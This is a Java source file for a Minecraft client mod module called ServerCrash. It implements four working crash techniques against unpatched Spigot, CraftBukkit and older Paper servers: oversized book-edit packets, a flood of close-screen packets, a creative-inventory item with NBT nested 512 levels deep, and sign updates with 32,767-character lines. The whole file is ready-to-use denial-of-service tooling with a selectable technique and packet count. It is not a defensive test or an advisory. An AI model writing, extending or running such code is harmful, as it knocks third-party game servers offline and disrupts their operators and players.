package com.claudemc.module.impl.misc;

import com.claudemc.ClaudeMCMod;
import com.claudemc.module.Category;
import com.claudemc.module.Module;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;

import java.util.List;
import java.util.Optional;

/**
 * ServerCrash — documented packet-based server crash techniques.
 *
 * All techniques target known unpatched Spigot/CraftBukkit/old-Paper configurations.
 * Modern Paper (1.19.3+) and Purpur patch most of these.
 *
 * TECHNIQUES:
 *
 *  BookOverflow     — Sends a BookUpdateC2SPacket with max pages (100) each containing
 *                     max characters (32767). Crashes servers that process the full NBT
 *                     synchronously on the main thread (old Spigot/CB).
 *
 *  PacketFlood      — Rapidly sends CloseHandledScreenC2SPackets — exploits servers
 *                     with no packet-rate limiting to overflow the packet queue.
 *
 *  NBTOverflow      — Sends a creative-mode SetCreativeModeSlot packet with deeply
 *                     nested NBT compound data. Crashes servers without NBT depth limits.
 *
 *  SignOverflow      — Sends an UpdateSignC2SPacket with lines exceeding the server's
 *                     expected max length.
 */
public class ServerCrash extends Module {

    public ServerCrash() {
        super("ServerCrash",
              "Sends crash-inducing packets to vulnerable servers (Spigot/CB, unpatched)",
              Category.MISC);
        addSetting("Technique", "BookOverflow"); // BookOverflow|PacketFlood|NBTOverflow|SignOverflow
        addSetting("Packets",   "20");
    }

    @Override
    public void onEnable() {
        var client = MinecraftClient.getInstance();
        if (client.player == null || client.getNetworkHandler() == null) return;

        String tech = getSetting("Technique");
        int count   = parseInt(getSetting("Packets"), 20);

        switch (tech) {
            case "BookOverflow"  -> doBookOverflow(client);
            case "PacketFlood"   -> doPacketFlood(client, count);
            case "NBTOverflow"   -> doNBTOverflow(client);
            case "SignOverflow"  -> doSignOverflow(client);
        }

        setEnabled(false);
    }

    @Override public void onTick(MinecraftClient client) {}

    // ── Techniques ────────────────────────────────────────────────────────

    private void doBookOverflow(MinecraftClient client) {
        try {
            // 100 pages, each with 32767 characters
            String maxPage = "A".repeat(32767);
            List<String> pages = java.util.Collections.nCopies(100, maxPage);
            for (int i = 0; i < parseInt(getSetting("Packets"), 1); i++) {
                client.getNetworkHandler().sendPacket(
                    new BookUpdateC2SPacket(0, pages, Optional.empty()));
            }
            ClaudeMCMod.LOGGER.info("[ServerCrash][BookOverflow] Sent {} book packets.", getSetting("Packets"));
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ServerCrash][BookOverflow] {}", e.getMessage());
        }
    }

    private void doPacketFlood(MinecraftClient client, int count) {
        try {
            for (int i = 0; i < count; i++) {
                client.getNetworkHandler().sendPacket(new CloseHandledScreenC2SPacket(i % 127));
            }
            ClaudeMCMod.LOGGER.info("[ServerCrash][PacketFlood] Sent {} close packets.", count);
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ServerCrash][PacketFlood] {}", e.getMessage());
        }
    }

    private void doNBTOverflow(MinecraftClient client) {
        try {
            // Build deeply nested NBT: 512 levels deep
            net.minecraft.nbt.NbtCompound root = new net.minecraft.nbt.NbtCompound();
            net.minecraft.nbt.NbtCompound current = root;
            for (int i = 0; i < 512; i++) {
                net.minecraft.nbt.NbtCompound child = new net.minecraft.nbt.NbtCompound();
                current.put("n", child);
                current = child;
            }
            var stack = new net.minecraft.item.ItemStack(net.minecraft.item.Items.WRITTEN_BOOK);
            stack.setNbt(root);
            client.getNetworkHandler().sendPacket(
                new net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket(36, stack));
            ClaudeMCMod.LOGGER.info("[ServerCrash][NBTOverflow] Sent deep NBT packet.");
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ServerCrash][NBTOverflow] {}", e.getMessage());
        }
    }

    private void doSignOverflow(MinecraftClient client) {
        try {
            String overflowLine = "X".repeat(32767);
            String[] lines = {overflowLine, overflowLine, overflowLine, overflowLine};
            var pos = client.player.getBlockPos().down();
            client.getNetworkHandler().sendPacket(
                new net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket(pos, true, lines));
            ClaudeMCMod.LOGGER.info("[ServerCrash][SignOverflow] Sent sign overflow packet.");
        } catch (Exception e) {
            ClaudeMCMod.LOGGER.warn("[ServerCrash][SignOverflow] {}", e.getMessage());
        }
    }

    private int parseInt(String s, int fallback) {
        try { return Integer.parseInt(s); } catch (NumberFormatException e) { return fallback; }
    }
}
